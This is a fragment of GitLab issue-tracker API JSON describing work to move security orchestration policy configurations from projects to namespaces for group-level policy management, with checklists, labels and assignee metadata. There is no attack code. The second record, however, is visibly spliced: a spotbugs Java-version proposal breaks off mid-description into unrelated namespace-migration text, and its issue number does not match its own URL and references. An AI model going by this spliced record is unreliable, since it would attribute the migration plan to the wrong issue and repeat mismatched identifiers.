For now (until https://gitlab.com/gitlab-org/gitlab/-/issues/337100 is not merged) we need to support both project and namespace in all migrations/services \n\nAll of these share a common implementation (using `project_path` to find the affected project), so we can update them all at once.\n\n1. Add a new `full_path` argument, which can be a project or group path (will workspaces have a path?)\n1. If it is set, find the namespace by the `full_path` rather than the `project_path`\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T19:06:42.300Z","updated_at":"2022-05-23T11:42:18.064Z","closed_at":"2022-05-17T04:05:08.324Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueiró","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["Category:Security Policy Management","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"}],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347069","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":16,"completed_count":9},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"9 of 16 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347069","notes":"https://gitlab.com/api/v4/projects/278964/issues/347069/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347069/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347069","relative":"#347069","full":"gitlab-org/gitlab#347069"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4425,"epic":{"id":114110,"iid":4425,"title":"Group Level Policy Management","url":"/groups/gitlab-org/-/epics/4425","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98370736,"iid":347067,"project_id":278964,"title":"Update spotbugs default java versions to include 17","description":"### Proposal\n\nWe should update our default Java versions within spotbugs.

Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nIn order to facilitate future work to implement Group https://gitlab.com/groups/gitlab-org/-/epics/4425 and Workspace-level https://gitlab.com/groups/gitlab-org/-/epics/6881 security policies, we need to migrate the security policy objects to be related to a namespace rather than a project (see https://gitlab.com/groups/gitlab-org/-/epics/6473 for more details).\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [-] Documentation:\n- [-] Feature flag:\n- [-] Performance:\n- [ ] Testing: modify tests for updated classes/modules to include specs for new relationship,\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\nThe following classes need to be updated:\n\n- [x] ~backend extend `ee/app/models/security/orchestration_policy_configuration.rb` with `belongs_to :namespace, foreign_key: :namespace_id, optional: true`, modify `belongs_to :project` relationship to be optional and add validation rule to check that either `group` or `project` is provided,\n- [x] ~database ~~prepare background migration for `security_orchestration_policy_configurations` table to populate namespace_id column with `project.project_namespace_id` data,~~\n- [x] ~database add `namespace_id` column to `security_orchestration_policy_configurations` table,\n- [x] ~backend modify `#applicable_branches` method in `ee/app/models/security/orchestration_policy_rule_schedule.rb` to support `project` argument (default: `security_orchestration_policy_configuration.project`),\n- [x] ~backend add new scope `with_configuration_and_group_projects` in `ee/app/models/security/orchestration_policy_rule_schedule.rb` to groups with projects,\n- [x] ~backend extend `perform` method in `ee/app/workers/security/orchestration_policy_rule_schedule_worker.rb` to run schedule for all projects within the group that is associated with selected `security_policy_management_project`,\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T18:29:08.765Z","updated_at":"2022-04-18T09:41:08.664Z","closed_at":"2022-04-18T09:41:08.641Z","closed_by":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"labels":["Category:Security Policy Management","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"}],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347064","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":10,"completed_count":6},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"6 of 10 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347064","notes":"https://gitlab.com/api/v4/projects/278964/issues/347064/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347064/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347064","relative":"#347064","full":"gitlab-org/gitlab#347064"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4425,"epic":{"id":114110,"iid":4425,"title":"Group Level Policy Management","url":"/groups/gitlab-org/-/epics/4425","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null}]
